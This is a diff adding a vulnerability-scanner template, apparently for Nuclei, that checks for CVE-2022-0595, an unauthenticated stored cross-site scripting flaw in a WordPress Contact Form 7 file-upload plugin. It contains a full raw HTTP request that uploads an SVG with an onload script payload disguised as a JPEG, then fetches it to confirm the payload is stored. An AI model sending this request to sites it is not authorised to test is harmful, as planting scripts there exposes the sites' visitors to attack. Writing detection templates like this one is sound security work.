@@ -1,0 +1,53 @@
+id: CVE-2022-0595
+
+info:
+  name: Drag and Drop Multiple File Upload - Contact Form 7 < 1.3.6.3 - Unauthenticated Stored XSS
+  author: akincibor
+  severity: high
+  description: The plugin allows SVG files to be uploaded by default via the dnd_codedropz_upload AJAX action, which could lead to Stored Cross-Site Scripting issue.
+  reference:
+    - https://wpscan.com/vulnerability/1b849957-eaca-47ea-8f84-23a3a98cc8de
+  tags: wp,xss
+
+requests:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: en-GB,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161
+        Content-Length: 655
+        Connection: close
+        
+        -----------------------------92633278134516118923780781161
+        Content-Disposition: form-data; name="size_limit"
+
+        10485760
+        -----------------------------92633278134516118923780781161
+        Content-Disposition: form-data; name="action"
+        
+        dnd_codedropz_upload
+        -----------------------------92633278134516118923780781161
+        Content-Disposition: form-data; name="type"
+        
+        click
+        -----------------------------92633278134516118923780781161
+        Content-Disposition: form-data; name="upload-file"; filename="xss.svg"
+        Content-Type: image/jpeg
+        
+        <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+        -----------------------------92633278134516118923780781161--
+      - |
+        GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/xss.svg HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "alert(document.domain)")'
+          - 'status_code_2 == 200'
+        condition: and
